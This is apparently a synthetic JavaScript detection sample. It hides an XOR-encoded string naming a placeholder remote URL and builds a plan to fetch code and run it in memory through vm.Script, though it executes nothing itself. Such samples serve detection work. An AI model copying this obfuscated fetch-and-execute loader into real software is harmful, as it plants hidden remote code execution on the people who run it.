const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_dababd13 = "[64,11,7,74,69,66,83,70,69,11,87,85,71,67,95,68,83,105,68,83,91,89,66,83,26,82,95,69,70,87,66,85,94,105,91,83,91,89,68,79,74,87,82,87,70,66,83,68,11,80,83,66,85,94,105,66,94,83,88,105,80,67,88,85,66,95,89,88,74,69,66,87,81,83,105,85,89,67,88,66,11,7,74,85,87,91,70,87,95,81,88,105,95,82,11,120,121,114,115,27,15,5,5,1,3,15,7,114,74,67,68,90,11,94,66,66,70,69,12,25,25,88,89,82,83,27,15,5,5,1,3,15,7,82,83,83,6,87,24,83,78,87,91,70,90,83,24,95,88,64,87,90,95,82,25,87,70,95,74,67,69,83,68,105,87,81,83,88,66,11,120,89,82,83,119,67,82,95,66,25,15,5,5,1]";
const Codec_dababd13 = "decimal_array|single_byte_xor|36";

function load_dababd13() { return JSON.parse(Material_dababd13); }
function decode_dababd13(e) { return e.map((value) => value ^ 54); }
async function recover_dababd13() {
  const n = 2 > 1 ? "left" : "right";
  const e = load_dababd13(); let d = [];
  d = decode_dababd13(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_dababd13() { return (await recover_dababd13()).split("|").join("|"); }
async function plan_dababd13() { const inspect = inspect_dababd13; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_dababd13;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_dababd13());
